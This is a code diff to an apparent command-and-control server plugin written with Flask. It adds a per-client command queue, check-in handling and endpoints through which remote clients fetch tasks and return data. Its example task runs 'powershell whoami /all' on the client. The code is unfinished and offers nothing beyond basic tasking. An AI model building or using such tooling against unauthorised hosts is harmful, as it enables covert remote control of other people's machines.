@@ -33,7 +33,7 @@ import requests
 import os
 import json
 import argparse
-
+from Utils.ClientHandler import Client
 
 
 ################################################
@@ -124,6 +124,8 @@ class ExternalPluginClass():
 
         self.command_results_batch = []
 
+        self.client_objects = {}
+
         self.banner()
 
         self.start_subroutine()
@@ -170,10 +172,10 @@ class ExternalPluginClass():
         self.logger.debug(f"{self.logger.function_debug_symbol} {inspect.stack()[0][3]}")
         #self.app.route(f'/', methods = ["GET"])(self.plugin_function)
         #self.app.route(f'/<path:filename>', methods = ["GET"])(self.serve_file)
-        self.app.route(f'/command', methods = ["POST"])(self.endpoint_get_command)
+        self.app.route(f'/synccommand', methods = ["POST"])(self.endpoint_get_command)
 
         ## client endpoints
-        self.app.route(f'/clientname/command', methods = ["GET"])(self.client_get_command)
+        self.app.route(f'/command', methods = ["POST"])(self.client_get_command)
         self.app.route(f'/clientname/checkin', methods = ["POST"])(self.client_post_checkin)
         self.app.route(f'/clientdata', methods = ["POST"])(self.client_post_data)
 
@@ -186,22 +188,42 @@ class ExternalPluginClass():
         '''
         An endpont that gets the JSON from the server for commands for clients
         
+        so, server -> posts to this endpoint to update the command queue for clients
+
+
+        {
+            'command':['powershell', 'whoami /all'] #to get added to queue
+            'client': "clientid" # which client to add this command to
+
+        }
+
         '''
+
 
     def client_get_command(self):
         '''
-        For clients to get commands
+        For clients to get commands - should prolly be a post for the client name & any auth.
+
+        this is where the clients "checkin"
         
         '''
+        client_name = "test"
+
+        client_object = self.check_in_client(client_name)
+
+        ## need to figure out formatting here too witht he command
+        command = client_object.dequeue_command()
+
+
         command = {
-            "command":['powershell', 'whoami /all']
+            "command": command#['powershell', 'whoami /all']
         }
 
         return jsonify(command)
     
     ## [x] POST works with postman
     def client_post_checkin(self):
-        '''
+        '''/checkin
         POST
         Where clients can check in
         
@@ -240,8 +262,6 @@ class ExternalPluginClass():
         
         '''
         try:
-            #print("hafdhsfasdhfasdjfhasdk")
-
             id = request.json.get('id')
             timestamp = request.json.get('timestamp')
             data = request.json.get('data')
@@ -264,6 +284,30 @@ class ExternalPluginClass():
 
         return ""
 
+################################################
+# Client Object Ops
+################################################
+
+    def check_in_client(self, name, **kwargs):
+        '''
+        Sweet little checkin function to check if a client object exsists or not.
+
+        Returns said object.
+        
+        '''
+        if name not in self.client_objects:
+            # Create a new client object if it's a new client
+            self.client_objects[name] = Client(name, **kwargs)
+        return self.client_objects[name]
+
+    def get_client(self, name):
+        '''
+        Get a client objet if ever needed
+        
+        '''
+        #args: Name, what to return if not found
+        # .get does not return a keyerror, instead it return whatever you speciy as the 2nd arg
+        return self.client_objects.get(name, None)
 
 ################################################
 # Some failsafes & subroutines
